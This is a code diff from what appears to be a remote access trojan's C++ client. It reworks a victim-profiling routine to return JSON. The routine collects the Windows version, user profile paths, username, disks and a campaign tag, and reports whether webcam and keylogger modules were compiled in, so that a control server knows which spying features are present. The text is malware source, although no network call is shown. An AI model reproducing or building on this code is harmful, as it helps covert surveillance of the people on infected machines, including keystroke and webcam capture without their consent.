@@ -1,4 +1,5 @@
 #include "SystemInformation.h"
+#include "json.hpp"
 
 
 std::string SystemInformation::getWindowsVersion() {
@@ -48,35 +49,28 @@ std::string SystemInformation::getUsername() {
     return str;
 }
 
-std::string SystemInformation::vector2string(std::vector<std::string> vector) {
-    std::ostringstream vts;
-    std::copy(vector.begin(), vector.end() - 1,
-              std::ostream_iterator<std::string>(vts, ", "));
-    vts << vector.back();
-    return vts.str();
-}
 
 // Creating vector with all information related to the system
-std::vector<std::string> SystemInformation::getSystemInformation() {
-    std::vector<std::string> informationVector;
-    informationVector.push_back(getWindowsVersion());
-    informationVector.emplace_back(getenv("USERPROFILE"));
-    informationVector.emplace_back(getenv("HOMEPATH"));
-    informationVector.emplace_back(getenv("HOMEDRIVE"));
-    informationVector.push_back(getUsername());
-    informationVector.push_back(vector2string(FileManager::getDisks()));
-    informationVector.emplace_back(TAG_NAME);
+nlohmann::json SystemInformation::getSystemInformation() {
+    nlohmann::json json;
+    json["win_ver"] = getWindowsVersion();
+    json["user_profile"] = getenv("USERPROFILE");
+    json["home_path"] =  getenv("HOMEPATH");
+    json["home_drive"] =  getenv("HOMEDRIVE");
+    json["username"] = getUsername();
+    json["disks"] = FileManager::getDisks();
+    json["tag_name"] = TAG_NAME;
     // Add or not modules to server
 #ifdef WEBCAM
-    informationVector.emplace_back("true");
+    json["webcam"] = true;
 #else
-    informationVector.emplace_back("false");
+    json["webcam"] = false;
 #endif
 #ifdef KEYLOGGER_DEF
-    informationVector.emplace_back("true");
+    json["keylogger"] = true;
 #else
-    informationVector.emplace_back("false");
+    json["keylogger"] = false;
 #endif
-    return informationVector;
+    return json;
 }
 
